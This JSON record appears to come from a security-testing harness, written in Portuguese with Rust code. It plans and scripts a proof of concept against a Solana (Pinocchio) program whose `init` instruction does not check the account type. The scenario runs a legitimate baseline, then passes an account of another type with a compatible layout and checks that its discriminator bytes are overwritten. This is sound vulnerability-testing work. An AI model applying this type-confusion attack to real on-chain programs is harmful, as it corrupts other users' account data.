{
  "plan": "O programa `init` (Pinocchio) escreve um discriminador fixo [1..8] e campos de config nos offsets 0..49 de `accounts[0]`, sem validar o tipo da conta. O baseline usa uma conta vazia (recém-criada) como `accounts[0]` e uma authority, provando que o uso legítimo grava o layout esperado. O ataque fornece uma conta de outro tipo (discriminador diferente, ex.: [9,9,9,9,9,9,9,9]) com layout compatível como `accounts[0]`, e o programa sobrescreve seus dados como se fosse uma config. O efeito medido é que os primeiros 8 bytes da conta de outro tipo passam a ser [1,2,3,4,5,6,7,8], demonstrando que uma conta de tipo diferente foi aceita e corrompida.",
  "scenario": "let authority = Pubkey::new_unique();
let authority_acc = wallet(1_000_000_000);

// Conta de outro tipo (discriminador diferente) com layout compativel
let mut other_data = vec![0u8; 64];
other_data[0..8].copy_from_slice(&[9, 9, 9, 9, 9, 9, 9, 9]);
other_data[8..40].copy_from_slice(&[7u8; 32]);
other_data[40] = 42;
other_data[41..49].copy_from_slice(&123u64.to_le_bytes());
let other_acc = account(&env.program_id, &other_data, None);

// Conta vazia para o baseline (uso legitimo)
let empty_acc = empty_account();

let metas = vec![
    AccountMeta::new(empty_acc_key, true),
    AccountMeta::new_readonly(authority, false),
];

// Baseline: init em conta vazia (legitimo)
let baseline_ix = env.raw_ix(&[0u8], metas.clone());
let baseline_accounts = vec![
    (empty_acc_key, empty_acc),
    (authority, authority_acc.clone()),
];
let baseline_res = env.baseline("init legitimo em conta vazia", &baseline_ix, &baseline_accounts);

// Ataque: init em conta de outro tipo
let attack_metas = vec![
    AccountMeta::new(other_acc_key, true),
    AccountMeta::new_readonly(authority, false),
];
let attack_ix = env.raw_ix(&[0u8], attack_metas);
let attack_accounts = vec![
    (other_acc_key, other_acc),
    (authority, authority_acc),
];
let r = env.attack("init em conta de outro tipo (cosplay)", &attack_ix, &attack_accounts);

if r.program_result == ProgramResult::Success {
    let after_data = after(&r, &other_acc_key).data();
    env.effect(
        "conta de outro tipo foi sobrescrita com o discriminador de config",
        after_data.len() >= 8 && after_data[0..8] == [1, 2, 3, 4, 5, 6, 7, 8],
    );
}"
}

